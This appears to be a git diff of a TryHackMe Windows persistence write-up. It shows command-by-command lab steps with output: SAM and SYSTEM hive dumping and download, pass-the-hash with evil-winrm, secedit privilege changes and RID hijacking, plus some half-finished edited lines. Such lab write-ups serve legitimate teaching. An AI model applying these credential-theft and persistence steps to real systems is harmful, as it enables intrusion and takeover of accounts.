@@ -29,7 +29,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
-7. `evil-winrm -i {TARGET IP} -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
+7. `evil-winrm -i <TARGET IP> -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
 ```Bash
 root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321
 
@@ -63,19 +63,19 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
 ```
-10. `reg save hklm\system {FILENAME1}.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
+10. `reg save hklm\system <FILENAME1>.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
 The operation completed successfully.
 
 ```
-11. `reg save hklm\sam {FILENAME2}.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
+11. `reg save hklm\sam <FILENAME2>.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
 The operation completed successfully.
 
 ```
-12. `download {FILENAME1}.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
+12. `download <FILENAME1>.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SYSTEM.bak
 Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
@@ -83,7 +83,7 @@ Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
                                                              
 Info: Download successful!
 ```
-13. `download {FILENAME2}.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
+13. `download <FILENAME2>.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SAM.bak
 Info: Downloading C:\\SAM.bak to SAM.bak
@@ -123,7 +123,7 @@ thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:
 thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
 [*] Cleaning up... 
 ```
-17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}` from our Linux attack machine to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
+17. `evil-winrm -i <TARGET IP> -u Administrator -H {PASSWORD HASH}` from our Linux attack machine to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
 ```Bash
 root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 
@@ -155,7 +155,7 @@ PS C:\Users\Administrator>
 ```PowerShell
 PS C:\Users\Administrator> cd \
 ```
-4. `whoami` from the compromised Windows machine to display who we're running as onto our terminal, which revealed to us that we were running as administrator
+4. `whoami` from the compromised Windows machine to display who we're running as onto our terminal, which showed us that we were running as administrator
 ```PowerShell
 PS C:\> whoami
 wpersistence\administrator
@@ -225,7 +225,7 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/4/2023   2:56 AM          19318 CONFIG.inf
 ```
-8. `notepad {FILENAME1}.inf` from the compromised Windows machine to open up the exported information file containing the compromised system's security configuration using Windows' Notepad text editor
+8. `notepad <FILENAME1>.inf` from the compromised Windows machine to open up the exported information file containing the compromised system's security configuration using Windows' Notepad text editor
 ```PowerShell
 PS C:\Users\Administrator> notepad CONFIG.inf
 ```
@@ -236,18 +236,18 @@ PS C:\Users\Administrator> notepad CONFIG.inf
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/CONFIG.inf%20Modifications.png)
 
-10. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb` from the compromised Windows machine to import our modified information (.inf) file containing the new security configuration for our compromised machine into a security database (.sdb) file, which will store our modified security configuration
+10. `secedit /import /cfg <FILENAME1>.inf /db <FILENAME2>.sdb` from the compromised Windows machine to import our modified information (.inf) file containing the new security configuration for our compromised machine into a security database (.sdb) file, which will store our modified security configuration
 ```PowerShell
 PS C:\> secedit /import /cfg config.inf /db config.sdb
 ```
-11. `secedit /configure /db {FILENAME2}.sdb /cfg {FILENAME1}.inf` from the compromised Windows machine to override and configure their new security settings using the security database (.sdb) file we created, along with our modified information (.inf) file containing the compromised machine's modified security configuration, which ended up successfully executing
+11. `secedit /configure /db <FILENAME2>.sdb /cfg <FILENAME1>.inf` from the compromised Windows machine to override and configure their new security settings using the security database (.sdb) file we created, along with our modified information (.inf) file containing the compromised machine's modified security configuration, which ended up successfully executing
 ```PowerShell
 PS C:\> secedit /configure /db config.sdb /cfg config.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
 ```
-12. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
+12. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` to display a graphical UI that'll allow us to modify the properties of the default session configuration for PowerShell remoting, which we'll do by add our target user (thmuser2) to the list of users who can remotely access PowerShell and assign them full privileges to allow them to not only access PowerShell but execute PowerShell commands as well
 ```PowerShell
 PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
 WARNING: Set-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name
@@ -275,7 +275,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
-15. `evil-winrm -i {TARGET IP} -u thmuser2 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
+15. `evil-winrm -i <TARGET IP> -u thmuser2 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
 ```Bash
 root@ip-10-10-254-192:~# evil-winrm -i 10.10.56.140 -u thmuser2 -p Password321
 
@@ -285,7 +285,8 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\thmuser2\Documents> 
 ```
-16. `whoami /priv`
+16. `whoami /priv` from the command line in our active WinRM session to display all the privileges that the current user that we're running as (thmuser2) has on the compromised Windows machine, along with their descriptions, onto our terminal, which showed that they do indeed have the two privileges that we previous assigned to them from the compromised machine, which allowed us to execute the **flag2.exe** program without any restrictions 
+ them 
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser2\Documents> whoami /priv
 
@@ -313,7 +314,7 @@ THM{IM_JUST_A_NORMAL_USER}
 ```PowerShell
 PS C:\Users\Administrator> cd \
 ```
-3. `wmic useraccount get name,sid`
+3. `wmic useraccount get name,sid` from the compromised Windows machine to retrieve and display onto our terminal the names and Security Identifiers (SID) of all user accounts that are on the compromised Windows machine, for which the last bit represents the user's Relative ID (RID)
 ```PowerShell
 PS C:\> wmic useraccount get name,sid
 Name                SID
@@ -327,11 +328,11 @@ thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
 thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013
 WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
 ```
-4. `cd C:\tools\pstools`
-```PowerShell
+4. `cd <PSTOOLS PATH>` from the compromised Windows machine to
+```PowerShell to change into 
 C:\>cd C:\tools\pstools
 ```
-5. `PsExec64 -i -s regedit`
+5. `PsExec64 -i -s regedit` from the compromised Windows machine to 
 ```PowerShell
 C:\tools\pstools>PsExec64 -i -s regedit
 
@@ -348,7 +349,7 @@ Sysinternals - www.sysinternals.com
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20New%20RID.png)
 
-6. `evil-winrm -i {TARGET IP} -u thmuser3 -p Password321`
+6. `evil-winrm -i <TARGET IP> -u thmuser3 -p Password321` from our Linux attack machine to
 ```Bash
 root@ip-10-10-28-182:~# evil-winrm -i 10.10.159.254 -u thmuser3 -p Password321
 
@@ -368,12 +369,12 @@ Error: Exiting with code 1
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open%20Command%20Prompt.png)
 
-8. `whoami`
+8. `whoami` from the command line in our active WinRM session to
 ```PowerShell
 C:\Users\Administrator>whoami
 wpersistence\administrator
 ```
-9. `C:\flags\flag3.exe` to run the flag3.exe program, which ended up displaying this task's flag onto our terminal
+9. `C:\flags\flag3.exe` from the command line in our active WinRM session to run the flag3.exe program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Users\Administrator>C:\flags\flag3.exe
 THM{TRUST_ME_IM_AN_ADMIN}
